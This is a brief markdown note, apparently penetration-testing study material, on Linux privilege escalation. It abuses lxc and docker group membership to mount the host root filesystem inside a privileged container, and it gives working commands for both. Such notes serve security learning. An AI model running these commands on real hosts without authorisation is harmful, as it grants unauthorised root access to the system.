#Linux_PrivilegeEscalation 

### Lxc

- We can modify the root path `/` using the following commands:
```bash
lxc image import {image} {image-name}
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```


### Docker

- If a user belongs to the `docker` group as follows:
```bash
docker-user@nix02:~$ id
uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

- We can mount the root filesystem to our container as follows:
```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

**Note**:
- The `--rm` means that the container will be deleted after we exit and `chroot` command means that we enter a `chroot` jail where `/mnt` will be treated as the root filesystem.
